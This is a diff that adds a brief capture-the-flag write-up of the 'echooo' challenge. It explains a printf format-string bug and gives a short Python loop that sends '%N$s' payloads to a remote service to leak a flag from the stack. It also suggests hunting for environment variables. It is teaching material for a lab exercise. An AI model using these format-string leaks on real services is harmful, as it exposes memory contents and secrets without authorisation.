@@ -1,0 +1,33 @@
+This is an overview the of the challenge "echooo" written up and solved by John Hammond
+
+1.) Recon
+	- Recieve binary and source
+	- Look at source code
+		- Can see some variables are declared for the buffer and for the flag
+		- Most importantly, there is a printf() bug
+			- This occurs when no format specifiers are given in a printf() function. This allows us to use any format specifiers we want
+			- We can just read up the stack
+		- From the source code we can see that the flag is stored on the stack
+			- We can see that it is created and then placed on the stack via a pointer
+	- So, we must leak up the stack to find the answer
+	- However, whenever we try %s we get a seg fault. Time to work around that
+
+2.) Exploitation
+	- Can use the %<num>$x notation to leak up the stack a certain amount of values
+	- So, we can write a loop and just try and brute force where the flag is on the stack
+	- Basically the final code looks like
+		- for i in range(10):
+			s = remote(host, port)
+			s.recvuntil('> ')
+
+			s.sendline('%' +str(i)+ '$s')
+			response = s.recv()
+			if ('dumped core' in response):
+				print('segfault')
+			else:
+				print response
+
+			s.close()
+
+
+NOTE: for format string vulns, its helpful to ignore seg faults and go up the stack printing out any strings you can. You can discover enviornment variables and things that you weren't intended to find out
